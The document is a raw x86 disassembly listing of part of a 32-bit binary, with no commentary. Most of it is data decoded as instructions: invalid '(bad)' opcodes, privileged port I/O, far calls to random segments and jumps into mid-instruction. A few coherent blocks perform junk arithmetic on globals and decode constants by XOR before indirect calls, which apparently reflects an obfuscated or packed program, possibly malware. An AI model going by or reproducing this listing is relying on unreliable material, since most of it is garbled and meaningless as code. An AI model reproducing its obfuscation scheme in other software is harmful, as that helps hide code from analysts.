  406277:	xchg   edi,eax
  406278:	mov    eax,0x22c811a0
  40627d:	sub    DWORD PTR [edi],0x55
  406280:	test   bh,0x55
  406283:	ret    0xebb9
  406286:	jmp    DWORD PTR [eax+0x7a8d9987]
  40628c:	xor    BYTE PTR [edx+0x350d3c2b],0x42
  406293:	sbb    ecx,eax
  406295:	cmp    dl,cl
  406297:	(bad)  [ebx+0x2f]
  40629a:	adc    al,0x7f
  40629c:	push   edx
  40629d:	adc    DWORD PTR fs:[edi-0x74a13da1],0xffffffe5
  4062a5:	stos   DWORD PTR es:[edi],eax
  4062a6:	jmp    0x406261
  4062a8:	les    esp,FWORD PTR [ebx+esi*2+0x6d0e4604]
  4062af:	adc    DWORD PTR [ebp+0x3bab9dc6],ebx
  4062b5:	xchg   ebx,eax
  4062b6:	pusha  
  4062b7:	xchg   esp,eax
  4062b8:	shr    DWORD PTR [ecx+eax*1+0x39],1
  4062bc:	jbe    0x406249
  4062be:	mov    ebx,0x23d3119c
  4062c3:	stos   DWORD PTR es:[edi],eax
  4062c4:	clc    
  4062c5:	in     al,dx
  4062c6:	push   0x3f9d3ea3
  4062cb:	cli    
  4062cc:	ret    0xb8f2
  4062cf:	cmp    edi,DWORD PTR [ebp-0x4c29753d]
  4062d5:	pushf  
  4062d6:	jnp    0x406321
  4062d8:	fist   DWORD PTR [esi]
  4062da:	mov    ds:0x21058d57,eax
  4062df:	pop    ebp
  4062e0:	daa    
  4062e1:	mov    ds:0x7ddd4448,al
  4062e6:	xchg   DWORD PTR [edx+0x16],esp
  4062e9:	fldenv [edi-0x6a032bf4]
  4062ef:	daa    
  4062f0:	push   edi
  4062f1:	out    0x31,eax
  4062f3:	loop   0x4062e2
  4062f5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4062f7:	mov    ds:0xaba89c97,al
  4062fc:	ficomp DWORD PTR [edx+0x43]
  4062ff:	cmp    esp,ebp
  406301:	imul   esi,ecx,0x74431495
  406307:	push   es
  406308:	xor    DWORD PTR [eax-0xb01c92e],edi
  40630e:	js     0x40634a
  406310:	or     ebx,eax
  406312:	mov    ch,0x53
  406314:	arpl   WORD PTR [ebp-0x4d91e27c],dx
  40631a:	clc    
  40631b:	push   0xffffffb1
  40631d:	rcr    BYTE PTR [ecx],1
  40631f:	mov    dl,0x87
  406321:	call   0x3553:0x9d1d675a
  406328:	xchg   esi,eax
  406329:	mov    esi,eax
  40632b:	mov    eax,0x84af1454
  406330:	int    0x3
  406332:	addr16 outs dx,BYTE PTR ds:[si]
  406335:	clc    
  406336:	cld    
  406337:	pop    ss
  406338:	stc    
  406339:	loopne 0x406340
  40633b:	mov    dl,0x14
  40633d:	pop    ebx
  40633e:	iret   
  40633f:	xchg   edi,eax
  406340:	mov    ds:0x4c3f9292,al
  406345:	mov    cs,WORD PTR ds:0x4ee6018a
  40634b:	sar    BYTE PTR [eax+esi*4],0x3d
  40634f:	jbe    0x406316
  406351:	add    DWORD PTR [edi+0x84af268],ecx
  406357:	sti    
  406358:	xlat   BYTE PTR ds:[ebx]
  406359:	add    edx,eax
  40635b:	inc    ecx
  40635c:	push   0x3b41cf9e
  406361:	xor    DWORD PTR [ebp-0x79a537f5],0x25
  406368:	in     eax,dx
  406369:	clc    
  40636a:	lea    ebp,[ebp-0x3d]
  40636d:	jge    0x40631a
  40636f:	pop    ds
  406370:	mov    ah,0x70
  406372:	sub    BYTE PTR [eax-0x1],dh
  406375:	jae    0x40636d
  406377:	pop    esp
  406378:	sub    eax,0xa6bd536d
  40637d:	xchg   edx,eax
  40637e:	stos   DWORD PTR es:[edi],eax
  40637f:	push   ecx
  406380:	ret    0x4480
  406383:	mov    eax,ds:0xc701c58f
  406388:	jp     0x406341
  40638a:	sub    eax,0x2fc4f96d
  40638f:	inc    DWORD PTR [ebp+0x56b760f0]
  406395:	aas    
  406396:	push   esi
  406397:	mov    ds:0x6baf30e,eax
  40639c:	inc    esi
  40639d:	adc    DWORD PTR [ebx],esp
  40639f:	or     BYTE PTR [ecx-0x3a5a73c2],ah
  4063a5:	iret   
  4063a6:	dec    edx
  4063a7:	or     esi,esp
  4063a9:	mov    ah,0xc0
  4063ab:	pop    ds
  4063ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063ad:	or     ebx,esi
  4063af:	sub    edi,DWORD PTR [ebp+0x61]
  4063b2:	jbe    0x40640c
  4063b4:	scas   al,BYTE PTR es:[edi]
  4063b5:	mov    ah,0x49
  4063b7:	push   ebp
  4063b8:	mov    bh,0x82
  4063ba:	jmp    0x16b8d7d
  4063bf:	cmp    bh,dh
  4063c1:	jbe    0x406400
  4063c3:	mov    cl,0xe4
  4063c5:	pop    ebp
  4063c6:	sti    
  4063c7:	and    BYTE PTR [eax-0x5a9d9bd7],0x77
  4063ce:	gs jl  0x4063ad
  4063d1:	pop    ebp
  4063d2:	pushf  
  4063d3:	test   eax,0xeab8f6c5
  4063d8:	sar    BYTE PTR [eax],1
  4063da:	sbb    al,0xfa
  4063dc:	xor    esi,DWORD PTR [eax-0x72]
  4063df:	pop    ebx
  4063e0:	leave  
  4063e1:	lods   eax,DWORD PTR ds:[esi]
  4063e2:	loop   0x406444
  4063e4:	stc    
  4063e5:	push   ecx
  4063e6:	sub    al,0x54
  4063e8:	je     0x40643a
  4063ea:	mov    dl,0x8f
  4063ec:	jl     0x4063ef
  4063ee:	dec    ebx
  4063ef:	mov    ebx,0x46c1abb7
  4063f4:	mov    ebx,eax
  4063f6:	cmp    BYTE PTR [ecx-0x1a],dl
  4063f9:	ret    0xe151
  4063fc:	inc    esi
  4063fd:	push   edx
  4063fe:	stc    
  4063ff:	xchg   ebx,eax
  406400:	sub    al,0xd3
  406402:	popa   
  406403:	mov    cl,0xd2
  406405:	rcl    dl,0x69
  406408:	dec    eax
  406409:	addr16 jp 0x4063ae
  40640c:	out    dx,eax
  40640d:	pop    DWORD PTR [edi-0x7f]
  406410:	jns    0x40647d
  406412:	mov    eax,0x9387f632
  406417:	inc    edx
  406418:	out    0x8e,al
  40641a:	mov    es,ebx
  40641c:	cmp    ah,0x73
  40641f:	xchg   edi,eax
  406420:	pop    esi
  406421:	xchg   ebx,eax
  406422:	popf   
  406423:	(bad)  
  406424:	xchg   ecx,eax
  406425:	fmulp  st(1),st
  406427:	out    dx,eax
  406428:	and    dh,BYTE PTR [ebx-0x6]
  40642b:	add    al,0xed
  40642d:	sub    BYTE PTR cs:[edi],0xf9
  406431:	sti    
  406432:	mov    ss,WORD PTR [esi+edx*1-0x48]
  406436:	push   ebx
  406437:	bound  ebp,QWORD PTR [ebx+0x10a7d819]
  40643d:	jecxz  0x406407
  40643f:	xchg   esp,eax
  406440:	jg     0x4063dd
  406442:	push   0x897a8915
  406447:	inc    ebp
  406448:	loopne 0x4063cb
  40644a:	xor    eax,0x434386
  40644f:	hlt    
  406450:	es inc ebx
  406452:	add    bh,al
  406454:	inc    ebp
  406455:	fdiv   DWORD PTR [ecx]
  406457:	mov    ch,0x9c
  406459:	clc    
  40645a:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406461:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406468:	xor    DWORD PTR ds:0x432de2,edx
  40646e:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406475:	xor    eax,DWORD PTR ds:0x43439a
  40647b:	mov    eax,DWORD PTR [ebp-0xc]
  40647e:	sub    DWORD PTR ds:0x432de2,0x4326f0
  406488:	xor    eax,esi
  40648a:	add    DWORD PTR ds:0x4326f0,0x5eb6
  406494:	add    eax,edi
  406496:	adc    DWORD PTR ds:0x432dd6,0x2bbb
  4064a0:	mov    DWORD PTR [ebp-0x18],eax
  4064a3:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  4064aa:	sbb    eax,0x6f73
  4064af:	mov    BYTE PTR [ebp-0x1],0x67
  4064b3:	or     eax,0xf78
  4064b8:	mov    eax,DWORD PTR [ebp-0xc]
  4064bb:	xor    eax,esi
  4064bd:	add    eax,edi
  4064bf:	mov    DWORD PTR [ebp-0x18],eax
  4064c2:	neg    eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	sbb    DWORD PTR ds:0x4326ec,0x6660
  4064d1:	xor    eax,esi
  4064d3:	add    eax,edi
  4064d5:	sub    DWORD PTR ds:0x43442d,0x50c
  4064df:	push   eax
  4064e0:	sbb    DWORD PTR ds:0x4326f0,edx
  4064e6:	mov    eax,DWORD PTR [ebp-0x28]
  4064e9:	sub    DWORD PTR ds:0x432dd2,0x7292
  4064f3:	xor    eax,esi
  4064f5:	adc    DWORD PTR ds:0x43438e,0x434415
  4064ff:	add    eax,edi
  406501:	push   eax
  406502:	add    DWORD PTR ds:0x434386,ebx
  406508:	mov    eax,DWORD PTR [ebp-0x1c]
  40650b:	add    DWORD PTR ds:0x432dbe,0x432de6
  406515:	xor    eax,esi
  406517:	add    eax,edi
  406519:	add    DWORD PTR ds:0x434411,0x43441d
  406523:	push   eax
  406524:	lea    eax,[ebp-0x78]
  406527:	push   eax
  406528:	push   DWORD PTR [ebp-0xc]
  40652b:	adc    DWORD PTR ds:0x434386,0x78bf
  406535:	push   DWORD PTR [ebp-0x14]
  406538:	call   0x4055a2
  40653d:	sub    DWORD PTR ds:0x43439a,0x4326fc
  406547:	jmp    0x406894
  40654c:	test   al,0x25
  40654e:	xor    al,0x4
  406550:	mov    cl,0x11
  406552:	test   al,0xb1
  406554:	push   ebx
  406555:	fcmovb st,st(7)
  406557:	fisttp WORD PTR [edi]
  406559:	pop    edi
  40655a:	add    esi,DWORD PTR [edx+0x6b]
  40655d:	ds jo  0x4065d0
  406560:	and    BYTE PTR [ebp+0x70],bh
  406563:	jo     0x40650f
  406565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406566:	sub    DWORD PTR [ebx],edi
  406568:	loop   0x4065e0
  40656a:	xor    ch,bl
  40656c:	add    BYTE PTR [ecx+eax*1+0x66797430],al
  406573:	add    al,0x3f
  406575:	loope  0x4065b2
  406577:	enter  0x2dac,0xd0
  40657b:	xlat   BYTE PTR ds:[ebx]
  40657c:	pop    esi
  40657d:	inc    edi
  40657e:	test   DWORD PTR [eax],edi
  406580:	push   ebx
  406581:	mov    ds:0xcb50eb8f,al
  406586:	push   es
  406587:	in     al,dx
  406588:	jnp    0x40657a
  40658a:	jnp    0x406566
  40658c:	adc    BYTE PTR [edx-0x31],dh
  40658f:	inc    esp
  406590:	scas   al,BYTE PTR es:[edi]
  406591:	add    al,0x99
  406593:	add    DWORD PTR [ecx+0xe],esi
  406596:	mov    edi,0x8aeeac1a
  40659b:	mov    dh,0x7e
  40659d:	mov    eax,DWORD PTR [ebx-0x6f661b77]
  4065a3:	call   0xf3a7:0x9278f583
  4065aa:	xchg   ecx,eax
  4065ab:	mov    bl,0xd4
  4065ad:	call   0xbf286e40
  4065b2:	lods   al,BYTE PTR ds:[esi]
  4065b3:	test   al,0x93
  4065b5:	aaa    
  4065b6:	mov    WORD PTR [ecx],es
  4065b8:	xor    DWORD PTR gs:[ecx],edx
  4065bb:	loope  0x4065df
  4065bd:	out    dx,eax
  4065be:	mov    ch,0xf0
  4065c0:	rcr    ecx,cl
  4065c2:	cmp    al,0x4b
  4065c4:	shl    BYTE PTR cs:[ebp-0x77],cl
  4065c8:	aam    0x44
  4065ca:	ss pop ss
  4065cc:	shl    BYTE PTR [esi],1
  4065ce:	mov    bl,0x52
  4065d0:	lahf   
  4065d1:	mov    eax,0x2298a3eb
  4065d6:	mov    DWORD PTR [edi],ebp
  4065d8:	sub    esi,DWORD PTR [esi+ecx*4-0x70]
  4065dc:	xchg   edx,eax
  4065dd:	fs jg  0x4065a5
  4065e0:	mov    ebx,0x5d79e1cc
  4065e5:	mov    WORD PTR [esi+0x12f7027],?
  4065eb:	gs cmp esp,esi
  4065ee:	stc    
  4065ef:	idiv   DWORD PTR [esi+0x33639145]
  4065f5:	xor    BYTE PTR [ebx+eiz*1],dl
  4065f8:	ror    BYTE PTR [edi],0x3f
  4065fb:	rcl    DWORD PTR [ebx+eax*4],0xec
  4065ff:	gs in  eax,0x74
  406602:	mov    al,0xda
  406604:	adc    edi,0xea8e99ec
  40660a:	sbb    al,BYTE PTR [esp+esi*8-0x62237b83]
  406611:	das    
  406612:	jb     0x406621
  406614:	dec    edi
  406615:	(bad)  
  406616:	cwde   
  406617:	stc    
  406618:	cmp    cl,dh
  40661a:	test   DWORD PTR [ecx],ebp
  40661c:	test   eax,0x9bb4d932
  406621:	repz and ecx,DWORD PTR [ebx]
  406624:	out    dx,al
  406625:	in     eax,dx
  406626:	cdq    
  406627:	xchg   edx,eax
  406628:	into   
  406629:	jb     0x4066a1
  40662b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40662c:	int    0x70
  40662e:	push   cs
  40662f:	xor    BYTE PTR [eax],ah
  406631:	mov    ah,0xe8
  406633:	inc    esi
  406634:	add    esi,eax
  406636:	iret   
  406637:	and    DWORD PTR [ebx],edx
  406639:	jo     0x4065ed
  40663b:	imul   edi,DWORD PTR [edx+0x7],0x39
  40663f:	ror    BYTE PTR [eax+eiz*1],0x0
  406643:	add    eax,0x43d06191
  406648:	fst    DWORD PTR [edi+esi*2-0x18]
  40664c:	std    
  40664d:	mov    ?,WORD PTR [edx+esi*4+0x62]
  406651:	jp     0x4065ff
  406653:	mov    bh,0x6a
  406655:	xor    ecx,esi
  406657:	cmc    
  406658:	cmc    
  406659:	sub    BYTE PTR [ebx],dl
  40665b:	mov    ecx,0x11172083
  406660:	push   ds
  406661:	int3   
  406662:	arpl   si,si
  406664:	inc    eax
  406665:	stos   DWORD PTR es:[edi],eax
  406666:	in     eax,dx
  406667:	les    edx,FWORD PTR [edx-0x5b]
  40666a:	call   FWORD PTR [eax-0x376f3aec]
  406670:	and    BYTE PTR [eax+0x1a34de1f],al
  406676:	pop    es
  406677:	(bad)  [edx-0x7a]
  40667a:	call   0x606de404
  40667f:	xchg   ecx,eax
  406680:	sub    ebx,DWORD PTR [ecx+ebx*2+0x57]
  406684:	cmp    BYTE PTR [eax+0x934aa0c],bh
  40668a:	pop    esi
  40668b:	call   0x1568edbb
  406690:	push   es
  406691:	rcr    DWORD PTR [eax+0x6c6724b4],0x4d
  406698:	scas   al,BYTE PTR es:[edi]
  406699:	and    BYTE PTR [eax-0x56],dh
  40669c:	xchg   ebx,eax
  40669d:	rcl    BYTE PTR ds:0x1ddd6462,1
  4066a3:	pop    eax
  4066a4:	(bad)  [ebx]
  4066a6:	mov    eax,ds:0x5f0ff79f
  4066ab:	(bad)  
  4066ac:	retf   0x726
  4066af:	push   cs
  4066b0:	not    ebx
  4066b2:	ja     0x406673
  4066b4:	dec    eax
  4066b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066b6:	nop
  4066b7:	or     BYTE PTR [eax+0x5e],al
  4066ba:	ins    DWORD PTR es:[edi],dx
  4066bb:	pop    ecx
  4066bc:	sub    dh,0x1b
  4066bf:	mov    ch,0x22
  4066c1:	loop   0x406704
  4066c3:	jl     0x40670e
  4066c5:	jbe    0x40665d
  4066c7:	ins    BYTE PTR es:[edi],dx
  4066c8:	(bad)  
  4066c9:	cli    
  4066ca:	in     al,dx
  4066cb:	mov    bl,0xab
  4066cd:	icebp  
  4066ce:	pop    ebx
  4066cf:	mov    bl,BYTE PTR [edx-0x76]
  4066d2:	inc    eax
  4066d3:	sbb    al,al
  4066d5:	or     DWORD PTR [esp+ecx*8-0x18],esi
  4066d9:	or     BYTE PTR [ebx-0x60],bl
  4066dc:	jnp    0x406717
  4066de:	xchg   ecx,eax
  4066df:	adc    al,0xf9
  4066e1:	pop    ebx
  4066e2:	pmaddwd mm1,QWORD PTR [ebx-0x5c]
  4066e6:	mov    bh,0xc5
  4066e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066e9:	and    ebx,DWORD PTR ds:0x7e2d1359
  4066ef:	outs   dx,BYTE PTR ds:[esi]
  4066f0:	mov    al,0x4a
  4066f2:	retf   0x638e
  4066f5:	lods   eax,DWORD PTR ds:[esi]
  4066f6:	ficomp DWORD PTR [ecx-0x4]
  4066f9:	cmp    BYTE PTR [ebx+0x4c1f6578],bl
  4066ff:	lods   eax,DWORD PTR ds:[esi]
  406700:	aaa    
  406701:	dec    edi
  406702:	cwde   
  406703:	popa   
  406704:	stc    
  406705:	jge    0x4066c0
  406707:	aad    0x97
  406709:	jno    0x406782
  40670b:	clc    
  40670c:	jne    0x406698
  40670e:	cwde   
  40670f:	jle    0x4066cb
  406711:	mov    ebp,0xf8001f14
  406716:	lods   eax,DWORD PTR ds:[esi]
  406717:	sti    
  406718:	mov    esp,0x3806e7c3
  40671d:	call   0x50f5d28f
  406722:	addr16 jae 0x406772
  406725:	inc    eax
  406726:	sub    eax,0xef1673ef
  40672b:	sti    
  40672c:	add    al,0x72
  40672e:	cmp    BYTE PTR [esi+0x4cd2cefe],ah
  406734:	cs inc esi
  406736:	sar    cl,0x37
  406739:	jmp    0x4066d3
  40673b:	fidiv  WORD PTR [ebx]
  40673d:	stos   DWORD PTR es:[edi],eax
  40673e:	out    dx,eax
  40673f:	pop    ecx
  406740:	and    eax,DWORD PTR [ecx+0x44]
  406743:	and    eax,0xc5c0f22d
  406748:	push   eax
  406749:	xor    al,0x67
  40674b:	ins    DWORD PTR es:[edi],dx
  40674c:	inc    ebx
  40674d:	scas   eax,DWORD PTR es:[edi]
  40674e:	mov    ah,BYTE PTR [edi+edx*2]
  406751:	(bad)  
  406752:	aas    
  406753:	ret    0x1f54
  406756:	jne    0x4066f5
  406758:	or     BYTE PTR [ebx],dh
  40675a:	lods   al,BYTE PTR ds:[esi]
  40675b:	xchg   edx,eax
  40675c:	(bad)  
  40675d:	std    
  40675e:	push   cs
  40675f:	in     al,dx
  406760:	das    
  406761:	inc    edi
  406762:	int    0x2
  406764:	cs (bad) 
  406767:	push   ebp
  406768:	pop    es
  406769:	scas   eax,DWORD PTR es:[edi]
  40676a:	push   esp
  40676b:	mov    ecx,0x203ccba3
  406770:	push   es
  406771:	and    BYTE PTR [ecx+0x4624a6e9],dl
  406777:	pop    esi
  406778:	sbb    BYTE PTR [edi-0x762f0714],bh
  40677e:	retf   
  40677f:	mov    dh,0x62
  406781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406782:	(bad)  
  406783:	fs add eax,0x7140ed00
  406789:	cwde   
  40678a:	adc    bh,BYTE PTR [esi+0x2a406d84]
  406790:	fmul   QWORD PTR [esi+0x55381b77]
  406796:	lods   al,BYTE PTR ds:[esi]
  406797:	or     eax,0x290e89f7
  40679c:	imul   ebx,DWORD PTR [ecx],0x4b0b86f9
  4067a2:	inc    edx
  4067a3:	dec    edx
  4067a4:	imul   ebp,ebp,0x16
  4067a7:	xchg   esp,eax
  4067a8:	pop    ds
  4067a9:	cli    
  4067aa:	sub    ecx,DWORD PTR [edi-0x45e38b6e]
  4067b0:	test   BYTE PTR [edi],ah
  4067b2:	ja     0x406745
  4067b4:	and    ch,al
  4067b6:	sub    BYTE PTR [ebp-0x718bd31d],cl
  4067bc:	xor    ebp,edi
  4067be:	data16 mov bl,0x7d
  4067c1:	add    esp,DWORD PTR es:[ecx]
  4067c4:	fdivr  QWORD PTR [eax]
  4067c6:	imul   DWORD PTR [eax+0x2cc8ceea]
  4067cc:	mov    edx,0xcbd364ad
  4067d1:	jo     0x4067d4
  4067d3:	(bad)  
  4067d4:	inc    edi
  4067d5:	adc    al,0x3a
  4067d7:	pop    ebx
  4067d8:	imul   ebx,DWORD PTR [ecx+0x63],0xe22ed20b
  4067df:	jp     0x406796
  4067e1:	adc    cl,BYTE PTR [ebx-0x13]
  4067e4:	dec    eax
  4067e5:	mov    dl,BYTE PTR [edi]
  4067e7:	xor    eax,DWORD PTR [edi]
  4067e9:	jmp    0xa37f:0x5994989c
  4067f0:	in     eax,0xc0
  4067f2:	ds dec edi
  4067f4:	cmp    bh,BYTE PTR [ecx+0x23]
  4067f7:	and    DWORD PTR [ecx-0x1c5ede9f],edx
  4067fd:	jae    0x4067e4
  4067ff:	sbb    al,0xc
  406801:	out    0xd4,al
  406803:	push   ebp
  406804:	push   ss
  406805:	loop   0x40683d
  406807:	in     al,dx
  406808:	mov    fs,WORD PTR [ebx-0x6fa18285]
  40680e:	aad    0xae
  406810:	push   0xffffffae
  406812:	loope  0x406808
  406814:	stos   BYTE PTR es:[edi],al
  406815:	and    BYTE PTR [ebp+0x19],cl
  406818:	pusha  
  406819:	mov    esp,0xadaaa824
  40681e:	ss adc eax,0xb0765ab2
  406824:	test   al,0xd8
  406826:	fwait
  406827:	test   al,0x62
  406829:	das    
  40682a:	scas   al,BYTE PTR es:[edi]
  40682b:	lods   eax,DWORD PTR ds:[esi]
  40682c:	xchg   ah,dh
  40682e:	sbb    esi,esi
  406830:	xchg   ecx,edx
  406832:	sahf   
  406833:	dec    ebx
  406834:	test   eax,0x5f49fcbf
  406839:	icebp  
  40683a:	fmul   DWORD PTR [esi+eax*2+0x69]
  40683e:	xchg   esi,eax
  40683f:	pop    esi
  406840:	popa   
  406841:	sti    
  406842:	pushf  
  406843:	cdq    
  406844:	and    DWORD PTR [ebp+0x13957610],esi
  40684a:	add    eax,esp
  40684c:	or     eax,0x33b519b2
  406851:	jge    0x406812
  406853:	adc    eax,0x69d33aae
  406858:	ins    DWORD PTR es:[edi],dx
  406859:	inc    eax
  40685a:	sbb    al,0x20
  40685c:	mov    WORD PTR [eax+0x45d20ded],bp
  406863:	call   0xed41:0xd9aaaab0
  40686a:	retf   0x4266
  40686d:	xchg   esi,eax
  40686e:	int    0x73
  406870:	ss mov ch,0xda
  406873:	popa   
  406874:	das    
  406875:	sbb    al,0xfa
  406877:	add    al,0x11
  406879:	push   0xf
  40687b:	call   ecx
  40687d:	fbld   TBYTE PTR [ecx-0x1f]
  406880:	pop    edi
  406881:	stos   DWORD PTR es:[edi],eax
  406882:	lods   eax,DWORD PTR ds:[esi]
  406883:	loopne 0x4068c3
  406885:	clc    
  406886:	lahf   
  406887:	call   0xa63d2559
  40688c:	push   ebx
  40688d:	mov    al,ds:0x5eace046
  406892:	add    eax,0xc7c085dd
  406897:	add    eax,0x434425
  40689c:	jno    0x406917
  40689e:	add    BYTE PTR [eax],al
  4068a0:	je     0x406953
  4068a6:	lea    eax,[ebp-0x78]
  4068a9:	sbb    DWORD PTR ds:0x432dca,0x1ea3
  4068b3:	push   eax
  4068b4:	sbb    DWORD PTR ds:0x432de6,0x1ec2
  4068be:	mov    eax,DWORD PTR [ebp-0x14]
  4068c1:	and    DWORD PTR ds:0x432de2,0x7d59
  4068cb:	xor    eax,esi
  4068cd:	add    eax,edi
  4068cf:	push   eax
  4068d0:	mov    DWORD PTR ds:0x434366,0x11
  4068da:	cmp    DWORD PTR ds:0x434366,0x0
  4068e1:	je     0x406937
  4068e7:	cmp    DWORD PTR ds:0x434366,0x6
  4068ee:	jne    0x40690c
  4068f4:	push   0x434421
  4068f9:	push   DWORD PTR [ebp-0xc]
  4068fc:	push   0x55d8
  406901:	push   0x8f3f
  406906:	call   DWORD PTR ds:0x432c3a
  40690c:	cmp    DWORD PTR ds:0x434366,0x7
  406913:	jne    0x406924
  406919:	mov    eax,ds:0x434366
  40691e:	dec    eax
  40691f:	mov    ds:0x434366,eax
  406924:	xor    eax,eax
  406926:	add    eax,DWORD PTR ds:0x434366
  40692c:	dec    eax
  40692d:	mov    ds:0x434366,eax
  406932:	jmp    0x4068da
  406937:	mov    eax,DWORD PTR [ebp-0x10]
  40693a:	add    eax,0xaa
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x10]
  406943:	mov    eax,DWORD PTR [eax+0x198]
  406949:	push   DWORD PTR [eax]
  40694b:	call   0x40d076
  406950:	mov    DWORD PTR [ebp-0x8],eax
  406953:	cmp    DWORD PTR [ebp-0x8],0x0
  406957:	lea    eax,[ebp+0x4]
  40695a:	mov    DWORD PTR [ebp-0x20],eax
  40695d:	je     0x407755
  406963:	lea    eax,[ebp-0x18]
  406966:	push   eax
  406967:	mov    eax,DWORD PTR [ebp-0x2c]
  40696a:	xor    eax,esi
  40696c:	add    eax,edi
  40696e:	push   eax
  40696f:	mov    eax,DWORD PTR [ebp-0x1c]
  406972:	xor    eax,esi
  406974:	add    eax,edi
  406976:	push   eax
  406977:	push   DWORD PTR [ebp-0x8]
  40697a:	lea    eax,[ebp-0x78]
  40697d:	push   eax
  40697e:	jmp    0x406ccb
  406983:	mov    esi,?
  406985:	add    BYTE PTR [esi+0xa],bh
  406988:	mov    cs,WORD PTR [edx+0x39f75e8a]
  40698e:	aaa    
  40698f:	js     0x4069e1
  406991:	push   0xffffffab
  406993:	sbb    edi,DWORD PTR [edx]
  406995:	jo     0x406a07
  406997:	and    BYTE PTR [ebp+0x70],bh
  40699a:	jo     0x406931
  40699c:	pusha  
  40699d:	inc    esi
  40699e:	js     0x40697c
  4069a0:	addr16 cs pop ss
  4069a3:	cmp    bl,BYTE PTR [esi+0x5f]
  4069a6:	in     eax,0xca
  4069a8:	out    dx,al
  4069a9:	sub    eax,0x90ec1df5
  4069ae:	imul   DWORD PTR [ebx+0x24]
  4069b1:	jp     0x4069c8
  4069b3:	jnp    0x4069b8
  4069b5:	mov    ecx,0xbbc5939b
  4069ba:	pop    edi
  4069bb:	xchg   esi,eax
  4069bc:	stos   BYTE PTR es:[edi],al
  4069bd:	mov    bl,0x83
  4069bf:	sahf   
  4069c0:	dec    edi
  4069c1:	xchg   edx,eax
  4069c2:	es iret 
  4069c4:	int    0x99
  4069c6:	loopne 0x406a13
  4069c8:	sub    cl,BYTE PTR [edx+0x34]
  4069cb:	out    0x9f,eax
  4069cd:	iret   
  4069ce:	fld    QWORD PTR [esi+0x767b2e47]
  4069d4:	add    ch,BYTE PTR [edx]
  4069d6:	xchg   DWORD PTR [eax-0x499c8611],eax
  4069dc:	aaa    
  4069dd:	mov    BYTE PTR [ebp+ebp*8+0x4ba4ccdd],0x7
  4069e5:	cs jbe 0x4069f9
  4069e8:	mov    edi,esp
  4069ea:	test   eax,0x3e651fb9
  4069ef:	fst    QWORD PTR [edi+0x3a]
  4069f2:	inc    ebp
  4069f3:	int    0x23
  4069f5:	or     DWORD PTR [esi],eax
  4069f7:	icebp  
  4069f8:	mov    ds:0x7982e974,al
  4069fd:	aas    
  4069fe:	jbe    0x406a3c
  406a00:	into   
  406a01:	iret   
  406a02:	loope  0x4069e9
  406a04:	aas    
  406a05:	pop    ebp
  406a06:	stos   DWORD PTR es:[edi],eax
  406a07:	mov    edx,0x2f4ccf0c
  406a0c:	fdiv   st,st(2)
  406a0e:	xchg   edi,eax
  406a0f:	out    dx,eax
  406a10:	sub    eax,0x979692c4
  406a15:	mov    eax,ds:0xc8d9566
  406a1a:	pop    ebp
  406a1b:	out    0x8b,eax
  406a1d:	stos   BYTE PTR es:[edi],al
  406a1e:	mov    DWORD PTR ds:0x1bc1017a,edx
  406a24:	retf   
  406a25:	mov    bl,0x69
  406a27:	popf   
  406a28:	pop    ds
  406a29:	mov    ebp,0x773a369f
  406a2e:	push   esp
  406a2f:	test   DWORD PTR [esi+0x34],ebx
  406a32:	pop    edi
  406a33:	mov    ecx,0x402f957f
  406a38:	data16 xor bh,BYTE PTR ds:0xb33a2f62
  406a3f:	push   cs
  406a40:	cli    
  406a41:	pop    es
  406a42:	and    ecx,ebp
  406a44:	jge    0x406a52
  406a46:	add    al,0x9d
  406a48:	aam    0xdf
  406a4a:	sub    al,bh
  406a4c:	dec    edi
  406a4d:	xor    al,0x89
  406a4f:	ins    DWORD PTR es:[edi],dx
  406a50:	pop    ss
  406a51:	(bad)  
  406a52:	mov    esi,0xd6d7ccf1
  406a57:	imul   eax,edi,0xdd4ac69a
  406a5d:	or     eax,0x49cd138
  406a62:	fwait
  406a63:	xor    DWORD PTR [ecx+0x5c],edx
  406a66:	push   eax
  406a67:	add    BYTE PTR [ebx],bl
  406a69:	adc    al,0x9d
  406a6b:	inc    edi
  406a6c:	mov    edi,0xcfe22dcb
  406a71:	sbb    BYTE PTR [eax+0x14],dl
  406a74:	mov    eax,DWORD PTR ds:0x4ca40496
  406a7a:	jae    0x406ae0
  406a7c:	loopne 0x406a62
  406a7e:	inc    esi
  406a7f:	mov    ah,cl
  406a81:	mov    ch,0x1
  406a83:	int    0x8b
  406a85:	imul   edx,esi,0xffffffd1
  406a88:	ins    BYTE PTR es:[edi],dx
  406a89:	jno    0x406a4a
  406a8b:	addr16 out 0xe7,eax
  406a8e:	cmc    
  406a8f:	mov    dh,0x26
  406a91:	adc    al,0xf4
  406a93:	lods   al,BYTE PTR ds:[esi]
  406a94:	add    esi,DWORD PTR [ecx-0x3c]
  406a97:	xor    edx,esp
  406a99:	lods   eax,DWORD PTR ds:[esi]
  406a9a:	push   es
  406a9b:	leave  
  406a9c:	test   BYTE PTR [edx-0x4c],bh
  406a9f:	aad    0xcb
  406aa1:	sub    dl,ch
  406aa3:	rcr    DWORD PTR [edi],cl
  406aa5:	mov    esi,0x56a9dc13
  406aaa:	push   0x46
  406aac:	push   edx
  406aad:	add    ah,BYTE PTR [ecx-0x76]
  406ab0:	mov    eax,0x4618afb0
  406ab5:	xor    DWORD PTR [ebx-0x7f52e9a6],ecx
  406abb:	sbb    eax,0xa9eb8708
  406ac0:	sbb    edx,DWORD PTR [esi]
  406ac2:	xor    dl,bh
  406ac4:	rcr    DWORD PTR [esi+0x7330331c],cl
  406aca:	stos   DWORD PTR es:[edi],eax
  406acb:	add    ch,ch
  406acd:	mov    esp,0x3366f207
  406ad2:	or     DWORD PTR [esi+0x58],0xab092531
  406ad9:	pop    ss
